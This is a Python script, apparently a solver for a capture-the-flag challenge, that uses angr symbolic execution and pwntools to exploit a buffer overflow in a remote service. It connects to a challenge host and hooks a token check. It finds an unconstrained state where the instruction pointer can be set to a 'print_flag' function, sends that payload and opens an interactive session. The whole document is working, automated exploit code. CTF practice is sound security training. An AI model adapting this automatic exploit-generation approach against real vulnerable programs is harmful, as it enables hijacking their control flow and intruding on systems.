import angr
import claripy
import sys
from pwn import *
import logging

HOOK_ADDR = 0x4014bb

logging.getLogger('angr').setLevel(logging.CRITICAL)
logging.getLogger('pwnlib').setLevel(logging.CRITICAL)


def hook_access_func(state):
    f = open('token.txt', 'r')
    t = int(f.readline())
    f.close()

    print("[+] Setting token to %i" % t)
    state.regs.rdx = t


def main(argv):
    path_to_binary = argv[1]
    e = ELF(path_to_binary)
    #p = process(path_to_binary)
    p = remote('0.cloud.chals.io', 34720)

    p.recvuntil(b'<<< Here is a random token')
    token = int(p.recvline())
    print("[+] Received token: %i" % token)
    f = open('token.txt', 'w')
    f.write("%i" % token)
    f.close()

    project = angr.Project(path_to_binary)

    project.hook(HOOK_ADDR, hook_access_func, 0)

    symbolic_input = claripy.BVS("input", 100 * 8)

    initial_state = project.factory.entry_state(
        stdin=symbolic_input,
        add_options={
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS
        }
    )
    simulation = project.factory.simgr(
        initial_state,
        save_unconstrained=True,
        stashes={
            'active': [initial_state],
            'unconstrained': [],
            'found': [],
            'not_needed': []
        }
    )

    def has_found_solution():
        return simulation.found

    def has_unconstrained_to_check():
        return simulation.unconstrained

    def has_active():
        return simulation.active

    while (has_active() or has_unconstrained_to_check()) and (not has_found_solution()):
        for unconstrained_state in simulation.unconstrained:
            simulation.move('unconstrained', 'found')
        simulation.step()

    if simulation.found:
        solution_state = simulation.found[0]

        solution_state.add_constraints(
            solution_state.regs.rip == e.sym['print_flag'])
        solution = solution_state.solver.eval(symbolic_input, cast_to=bytes)
        # print(solution)
        print("[+] Throwing Exploit")
        p.sendline(solution)
        p.interactive()

    else:
        raise Exception('Could not find the solution')


if __name__ == '__main__':
    main(sys.argv)
